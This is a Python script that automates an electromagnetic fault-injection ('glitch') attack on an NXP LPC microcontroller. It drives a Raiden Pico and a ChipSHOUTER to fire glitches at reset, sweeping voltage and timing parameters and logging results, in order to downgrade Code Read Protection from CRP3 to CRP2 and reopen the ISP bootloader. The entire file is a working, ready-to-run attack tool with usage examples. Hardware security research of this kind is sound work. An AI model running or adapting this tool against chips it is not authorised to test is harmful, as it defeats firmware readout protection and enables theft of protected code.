#!/usr/bin/env python3
"""
CRP3 to CRP2 Downgrade Glitch Attack

Uses GPIO RESET trigger to glitch during boot and downgrades CRP3 to CRP2.
Success is determined by bootloader SYNC working (bootloader becomes active in CRP2).
"""

import serial
import time
import csv
from datetime import datetime
import sys

SERIAL_PORT = '/dev/ttyACM0'
BAUD_RATE = 115200
TIMEOUT = 2.0

def send_command(ser, cmd):
    """Send command in API mode and check response"""
    # Clear any pending data
    ser.read(ser.in_waiting)

    # Send command
    ser.write(f"{cmd}\r\n".encode())

    # Wait for '.' (command received)
    start = time.time()
    while time.time() - start < 1.0:
        if ser.in_waiting > 0:
            char = ser.read(1).decode('utf-8', errors='ignore')
            if char == '.':
                break

    # Wait for '+' (success) or '!' (failure)
    start = time.time()
    while time.time() - start < 1.0:
        if ser.in_waiting > 0:
            char = ser.read(1).decode('utf-8', errors='ignore')
            if char == '+':
                return True
            elif char == '!':
                return False

    return False

def check_cs_armed(ser):
    """Check if ChipSHOUTER is armed by querying status"""
    # Clear any pending data
    ser.read(ser.in_waiting)

    # Send CS STATUS command
    ser.write(b"CS STATUS\r\n")

    # Wait for '.' (command received)
    start = time.time()
    while time.time() - start < 1.0:
        if ser.in_waiting > 0:
            char = ser.read(1).decode('utf-8', errors='ignore')
            if char == '.':
                break

    # Wait for '+' or '!' and collect full response
    response = ""
    start = time.time()
    got_response = False
    while time.time() - start < 3.0:  # Longer timeout for status query
        if ser.in_waiting > 0:
            chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            response += chunk
            if '+' in response or '!' in response:
                got_response = True
                # Give it a bit more time to collect full response
                time.sleep(0.1)
                if ser.in_waiting > 0:
                    response += ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
                break

    if not got_response:
        return False

    # Check if "armed" appears in the status (ChipSHOUTER reports "armed" in status)
    # The response format includes "# armed:" or "state armed" when armed
    return "armed" in response.lower() and "disarmed" not in response.lower()

def wait_for_cs_armed(ser, timeout=5.0):
    """Poll CS STATUS until ChipSHOUTER reports armed or timeout"""
    start = time.time()
    while time.time() - start < timeout:
        if check_cs_armed(ser):
            return True
        time.sleep(0.1)  # Brief delay between polls
    return False

def wait_for_response(ser, expected_text, timeout=5.0):
    """Wait for specific text in serial response"""
    start_time = time.time()
    full_response = ""
    while time.time() - start_time < timeout:
        if ser.in_waiting > 0:
            chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            full_response += chunk
            if expected_text in full_response:
                return True, full_response
        time.sleep(0.01)
    return False, full_response

def setup_gpio_trigger(ser, voltage, pause, width):
    """Configure GPIO trigger and glitch parameters"""
    # Set ChipSHOUTER voltage
    send_command(ser, f"CS VOLTAGE {voltage}")

    # Set glitch timing parameters
    send_command(ser, f"SET PAUSE {pause}")
    send_command(ser, f"SET WIDTH {width}")
    send_command(ser, f"SET COUNT 1")

    # Configure GPIO trigger on GP3, rising edge (triggered by GP15 RESET)
    send_command(ser, "TRIGGER GPIO RISING")

def test_crp3_to_crp2_glitch(ser, voltage, pause, width):
    """
    Perform single CRP3→CRP2 glitch attempt

    Returns:
        tuple: (result, response_snippet)
        result: "SUCCESS" | "FAIL" | "ERROR"
        response_snippet: First 100 chars of response for debugging
    """
    # Arm the glitch trigger BEFORE TARGET SYNC
    # TARGET SYNC will reset the target internally, triggering the GPIO glitch
    send_command(ser, "ARM ON")

    # Try to SYNC with bootloader
    # TARGET SYNC command internally does:
    # 1. Resets target via TARGET RESET
    # 2. GP15 goes HIGH (triggers GP3 via GPIO trigger)
    # 3. Glitch fires during boot
    # 4. Attempts bootloader SYNC
    #
    # In CRP3: bootloader is disabled, SYNC will timeout/fail
    # In CRP2: bootloader is active, SYNC will succeed
    ser.write(b"TARGET SYNC 115200 12000 10\r\n")
    success, response = wait_for_response(ser, "LPC ISP sync complete", timeout=15.0)

    # Return response snippet for logging
    response_snippet = response[:150] if response else ""

    if success:
        return "SUCCESS", response_snippet
    elif "sync failed" in response.lower() or "no response from target" in response.lower() or "timeout" in response.lower():
        return "FAIL", response_snippet
    else:
        return "ERROR", response_snippet

def main():
    if len(sys.argv) < 5:
        print("Usage: python3 crp3_to_crp2_glitch.py <voltage> <pause> <width> <iterations>")
        print("Example: python3 crp3_to_crp2_glitch.py 290 0 150 1000")
        print()
        print("Parameters:")
        print("  voltage    - ChipSHOUTER voltage (e.g., 290)")
        print("  pause      - PIO cycles before glitch (e.g., 0)")
        print("  width      - Glitch pulse width in PIO cycles (e.g., 150)")
        print("  iterations - Number of attempts (e.g., 1000)")
        sys.exit(1)

    voltage = int(sys.argv[1])
    pause = int(sys.argv[2])
    width = int(sys.argv[3])
    iterations = int(sys.argv[4])

    print("=" * 70)
    print("CRP3 → CRP2 DOWNGRADE GLITCH ATTACK")
    print("=" * 70)
    print(f"Voltage: {voltage}V")
    print(f"Pause: {pause} cycles")
    print(f"Width: {width} cycles")
    print(f"Iterations: {iterations}")
    print(f"Trigger: GPIO RESET (GP15 → GP3)")
    print("=" * 70)
    print()

    # Create CSV log
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    csv_file = f"crp3_to_crp2_V{voltage}_P{pause}_W{width}_{iterations}x_{timestamp}.csv"

    # Connect to Raiden Pico
    print(f"Connecting to {SERIAL_PORT}...")
    ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
    time.sleep(0.5)

    try:
        # Enable API mode
        print("Enabling API mode...")
        ser.write(b"API ON\r\n")
        time.sleep(0.2)
        ser.read(ser.in_waiting)  # Clear response
        print("✓ API mode enabled\n")

        # Initial setup
        print("Setting up system...")
        send_command(ser, "TARGET LPC")
        setup_gpio_trigger(ser, voltage, pause, width)

        # ChipSHOUTER setup
        send_command(ser, "CS TRIGGER HARDWARE HIGH")
        send_command(ser, "CS ARM")

        # Poll status until ChipSHOUTER is armed
        print("Waiting for ChipSHOUTER to arm...")
        if wait_for_cs_armed(ser, timeout=5.0):
            print("✓ ChipSHOUTER armed and ready")
        else:
            print("WARNING: ChipSHOUTER may not be armed (timeout)")

        print("Setup complete\n")

        # Counters
        success_count = 0
        fail_count = 0
        error_count = 0

        start_time = time.time()
        last_print_time = start_time

        with open(csv_file, 'w', newline='', buffering=1) as f:
            writer = csv.writer(f)
            writer.writerow(['iteration', 'timestamp', 'voltage', 'pause', 'width', 'result', 'elapsed_time', 'response'])

            for i in range(iterations):
                test_start = time.time()

                result, response = test_crp3_to_crp2_glitch(ser, voltage, pause, width)

                test_elapsed = time.time() - test_start

                # Log to CSV
                ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                writer.writerow([i+1, ts, voltage, pause, width, result, f"{test_elapsed:.2f}", response])
                f.flush()

                # Update counters
                if result == "SUCCESS":
                    success_count += 1
                    print(f"\n[{i+1}/{iterations}] ✓✓✓ CRP3→CRP2 SUCCESS! ✓✓✓", flush=True)
                    print(f"  Bootloader now active! Parameters: V={voltage} P={pause} W={width}", flush=True)
                elif result == "FAIL":
                    fail_count += 1
                elif result == "ERROR":
                    error_count += 1
                    print(f"\n[{i+1}/{iterations}] ? ERROR: {response[:50]}", flush=True)

                # Print progress every 30 seconds
                current_time = time.time()
                if current_time - last_print_time >= 30:
                    elapsed = current_time - start_time
                    remaining = (elapsed / (i + 1)) * (iterations - (i + 1))
                    tests_per_sec = (i + 1) / elapsed

                    print(f"\n[{i+1}/{iterations}] Progress: {(i+1)/iterations*100:.1f}%", flush=True)
                    print(f"  SUCCESS: {success_count} ({success_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  FAIL: {fail_count} ({fail_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  ERROR: {error_count} ({error_count/(i+1)*100:.2f}%)", flush=True)
                    print(f"  Speed: {tests_per_sec:.2f} tests/sec", flush=True)
                    print(f"  Remaining: {remaining/60:.1f} minutes\n", flush=True)

                    last_print_time = current_time

                # If we found a success, ask if user wants to continue
                if success_count > 0 and (i+1) % 10 == 0:
                    print(f"\n✓ Found {success_count} successful CRP3→CRP2 downgrade(s) so far!", flush=True)

        # Final summary
        elapsed = time.time() - start_time
        print("\n" + "=" * 70)
        print("TEST COMPLETE")
        print("=" * 70)
        print(f"Duration: {elapsed/60:.1f} minutes ({elapsed/3600:.2f} hours)")
        print(f"Total tests: {iterations}")
        print(f"Tests/second: {iterations/elapsed:.2f}")
        print()
        print("Results:")
        print(f"  SUCCESS (CRP3→CRP2): {success_count:5d} ({success_count/iterations*100:6.2f}%)")
        print(f"  FAIL (still CRP3):   {fail_count:5d} ({fail_count/iterations*100:6.2f}%)")
        print(f"  ERROR:               {error_count:5d} ({error_count/iterations*100:6.2f}%)")
        print()
        print(f"Results saved to: {csv_file}")
        print("=" * 70)

        if success_count > 0:
            print()
            print("✓✓✓ CRP3→CRP2 DOWNGRADE SUCCESSFUL! ✓✓✓")
            print(f"Parameters: Voltage={voltage}V, Pause={pause}, Width={width}")
            print("Target bootloader is now accessible in CRP2 mode!")

    finally:
        # Disable API mode
        ser.write(b"API OFF\r\n")
        time.sleep(0.2)
        ser.close()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
